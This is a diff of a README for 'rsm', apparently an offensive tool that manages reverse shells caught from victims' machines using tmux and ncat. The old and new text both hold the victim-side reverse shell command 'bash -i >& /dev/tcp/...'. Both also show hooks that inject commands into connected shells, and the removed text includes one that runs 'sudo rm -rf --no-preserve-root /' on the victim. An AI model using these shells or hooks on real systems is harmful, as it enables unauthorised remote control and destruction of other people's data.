@@ -2,65 +2,79 @@
 
 A simple reverse shell manager using `tmux` and `ncat`.
 
-## Quick Start
-
-Listening on a port
-
-```shell
-git clone https://github.com/djosix/rsm.git
-cd rsm
-
-./rsm 11111
-# You will attach to a tmux session called 'rsm-11111',
-# where 11111 is your listening port.
-# You will not see rsm session when you open tmux
-# because it uses its own tmux socket.
-```
-
-On victim's machine, launch a reverse shell
-
-```shell
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0<&1'
-# Once connected to the listening port,
-# the script will create a window in our tmux session.
-# Just switch to that window and interact with the client.
-```
-
-Attaching to the last rsm session
-
-```shell
-./rsm attach
-```
-
-Stop the server and cleanup
-
-```shell
-./rsm stop
-# Stop all rsm listeners
-```
-
-Hooking the client connection
-
-```shell
-HOOK='echo Hello, you are $IP:$PORT' ./rsm d 12345
-nc 127.0.0.1 12345
-#| Hello, you are 127.0.0.1:50522
-#|
-
-HOOK='echo "echo hehe > ~/hacked"' ./rsm d 12345
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
-cat ~/hacked
-#| hehe
-
-HOOK='echo "sudo rm -rf --no-preserve-root /"' ./rsm d 12345
-bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1' # good luck
-```
-
 ## Install
 
 ```shell
-git clone --depth 1 https://github.com/djosix/rsm.git $HOME/.rsm
-# Then add $HOME/.rsm to your PATH
+curl https://raw.githubusercontent.com/djosix/rsm/master/rsm > /usr/local/bin/rsm
+```
+
+## Quick Start
+
+Listening on a port and attach to the session. (rsm creates a separated tmux socket, so it will not mess up your tmux sessions)
+
+```shell
+rsm 14641
+```
+
+On victim's machine, launch a reverse shell. Once the victim connects back, rsm will create a tmux window handling the TCP connection. The only thing you need to do is switching to that window in the rsm tmux session.
+
+```shell
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/14641 0<&1'
+```
+
+If a rsm session is detached, you can attach to it using this:
+
+```shell
+rsm attach
+```
+
+Stop the server and cleanup. If no port is specified, rsm will stop all listening sessions.
+
+```shell
+rsm stop [port1] [port2] [...]
+```
+
+## Settings
+
+Hooking the client connection, you can use `$IP` and `$PORT` in your command, which correspond to the client:
+
+```shell
+export RSM_HOOK='echo Hello, you are $IP:$PORT'
+rsm d 12345
+
+nc 127.0.0.1 12345
+```
+
+Client gets:
+
+```
+Hello, you are 127.0.0.1:50522
+```
+
+Injecting command to the reverse shell. (stdout of the hook command will be sent to the client socket, stderr will be printed out)
+
+```shell
+export RSM_HOOK='echo "echo hehe > ~/hacked"'
+rsm d 12345
+
+bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
+cat ~/hacked # hehe
+```
+
+Executing a command when rsm starts:
+
+```shell
+export RSM_WITH='ncat -lk 12345 -c "cat > test.txt"'
+rsm d 22222
+```
+
+Other settings:
+
+```shell
+export RSM_DIR=$HOME/.rsm   # where rsm sockets will be
+export RSM_MAX_CONN=32      # maximum number of connections
+export RSM_MAX_RECV=32      # maximum receiving mega-bytes
+rsm 13370
 ```
 
 ## Usage
@@ -81,4 +95,13 @@ Usage:
     rsm c[lean] PORT    Clean sockets for PORT
     rsm c[lean]         Clean all sockets
     rsm h[elp]          Show this help message
+
+    Configurable Variables:
+
+        RSM_DIR         Where the rsm sockets be stored (default: /tmp/.rsm)
+        RSM_MAX_CONN    Maximum number of connections (default: 128)
+        RSM_MAX_RECV    Maximum receiving MB (default: 64)
+        RSM_HOOK        Command to eval when a client connects
+        RSM_WITH        Command to eval when rsm starts
+
 ```
